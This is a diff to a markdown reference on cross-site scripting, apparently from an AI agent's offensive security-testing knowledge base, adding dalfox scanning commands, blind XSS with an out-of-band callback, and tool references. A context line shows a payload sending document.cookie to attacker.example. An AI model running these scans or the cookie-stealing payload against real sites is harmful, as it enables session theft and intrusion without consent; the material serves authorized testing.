@@ -12,6 +12,12 @@ origin: AI Threat Hunting
 - DOM manipulation from URL fragments, query params, postMessage
 - Rich text editors, comment systems, stored user content
 
+## Tools
+
+- `dalfox` (automated XSS scanner — parameter analysis, DOM detection, blind XSS via callback)
+- `curl` / Burp Suite Repeater (manual validation)
+- OOB callback server (operator-provisioned, self-hosted — see operator-core § Listener & Callback Management)
+
 ## Types
 
 | Type | Persistence |
@@ -19,6 +25,26 @@ origin: AI Threat Hunting
 | Reflected | None — requires victim click |
 | Stored | Persistent — triggers on page view |
 | DOM-based | Client-side JS processes input unsafely |
+
+## Automated Scanning with dalfox
+
+Run dalfox first for broad detection, then manually validate and escalate confirmed hits:
+
+```bash
+# Single URL with parameter
+dalfox url "https://TARGET/search?q=test" --silence
+
+# Pipe discovered URLs (from gau, katana, or param-fuzzing output)
+cat urls_with_params.txt | dalfox pipe --silence
+
+# With blind XSS callback (use OOB_CALLBACK_URL from operator dispatch context)
+dalfox url "https://TARGET/search?q=test" --blind "$OOB_CALLBACK_URL"
+
+# Custom payload injection with output
+dalfox url "https://TARGET/page?param=test" -o /engagement/scans/xss_results.json --format json
+```
+
+dalfox automates context detection, WAF bypass, and payload selection. Use it for initial sweeps, then switch to manual testing for stored XSS, DOM sinks, and complex chains.
 
 ## Detection
 
@@ -128,3 +154,4 @@ new Image().src='https://attacker.example/steal?c='+document.cookie  // Session 
 
 - `agent/references/payloads/xss-payloads.md` — DOM XSS, reflected, stored, filter bypass, CSP bypass, polyglots
 - `agent/references/vuln-checklists/A05-injection.md` — OWASP Top 10:2025 injection checklist
+- `agent/references/tools/exploitation/dalfox.md` — dalfox flags, pipe mode, blind XSS setup
